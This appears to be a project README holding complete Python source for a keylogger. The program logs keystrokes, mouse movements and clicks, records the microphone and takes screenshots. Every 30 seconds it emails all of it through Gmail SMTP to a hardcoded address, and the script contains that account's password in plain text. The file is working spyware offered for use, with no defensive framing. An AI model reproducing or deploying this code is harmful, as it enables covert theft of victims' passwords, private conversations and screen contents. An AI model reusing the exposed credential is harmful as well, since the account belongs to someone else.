# Project-Keylogger
This record audios, keylogs, mouse movements, and takes screenshots and sends it back to the mentioned email.
code:
import os
import sys
import time
import smtplib
import pyautogui
import threading
import sounddevice as sd
import soundfile as sf
from pynput import keyboard, mouse
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

log = ""
mouse_log = ""

def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        else:
            log += f" [{str(key)}] "

def on_click(x, y, button, pressed):
    global mouse_log
    if pressed:
        mouse_log += f"Mouse clicked at ({x}, {y}) [{button}]\n"

def on_move(x, y):
    global mouse_log
    mouse_log += f"Mouse moved to ({x}, {y})\n"

def record_audio(filename, duration=30):
    global log
    samplerate = 44100
    sd.default.samplerate = samplerate
    sd.default.channels = 2
    data = sd.rec(int(samplerate * duration), blocking=True)
    sf.write(filename, data, samplerate)

def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    
def update_data():
    global log, mouse_log
    # Update audio recording
    record_audio("audio.wav")
    # Update screenshot
    take_screenshot()
    
def send_email():
    global log, mouse_log
    from_email = "harsimran7724@gmail.com"
    to_email = "harsimran7724@gmail.com"
    password = "rggzdktxejzojyal"

    update_data()

    log_data = log
    mouse_log_data = mouse_log

    log = "" 
    mouse_log = ""

    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = "Keylogger Data"

    body = "Please find attached the keylogger data."
    msg.attach(MIMEText(body, 'plain'))

    # Attach keystrokes log
    with open("log.txt", "w") as log_file:
        log_file.write(log_data)
    log_attachment = open("log.txt", "rb")
    part_log = MIMEBase('application', 'octet-stream')
    part_log.set_payload(log_attachment.read())
    encoders.encode_base64(part_log)
    part_log.add_header('Content-Disposition', "attachment; filename=log.txt")
    msg.attach(part_log)
    log_attachment.close()

    # Attach audio recording
    record_audio("audio.wav")
    audio_attachment = open("audio.wav", "rb")
    part_audio = MIMEBase('application', 'octet-stream')
    part_audio.set_payload(audio_attachment.read())
    encoders.encode_base64(part_audio)
    part_audio.add_header('Content-Disposition', "attachment; filename=audio.wav")
    msg.attach(part_audio)
    audio_attachment.close()

    # Attach screenshot
    take_screenshot()
    screenshot_attachment = open("screenshot.png", "rb")
    part_screenshot = MIMEBase('application', 'octet-stream')
    part_screenshot.set_payload(screenshot_attachment.read())
    encoders.encode_base64(part_screenshot)
    part_screenshot.add_header('Content-Disposition', "attachment; filename=screenshot.png")
    msg.attach(part_screenshot)
    screenshot_attachment.close()

    # Attach mouse activity log
    with open("mouse_log.txt", "w") as mouse_log_file:
        mouse_log_file.write(mouse_log_data)
    mouse_log_attachment = open("mouse_log.txt", "rb")
    part_mouse_log = MIMEBase('application', 'octet-stream')
    part_mouse_log.set_payload(mouse_log_attachment.read())
    encoders.encode_base64(part_mouse_log)
    part_mouse_log.add_header('Content-Disposition', "attachment; filename=mouse_log.txt")
    msg.attach(part_mouse_log)
    mouse_log_attachment.close()

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_email, password)
    text = msg.as_string()
    server.sendmail(from_email, to_email, text)
    server.quit()

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def start_mouse_monitoring():
    with mouse.Listener(on_click=on_click, on_move=on_move) as listener:
        listener.join()

keylogger_thread = threading.Thread(target=start_keylogger)
mouse_monitoring_thread = threading.Thread(target=start_mouse_monitoring)

keylogger_thread.start()
mouse_monitoring_thread.start()

while True:
    send_email()
    time.sleep(30)  # Send email every 30 seconds
    
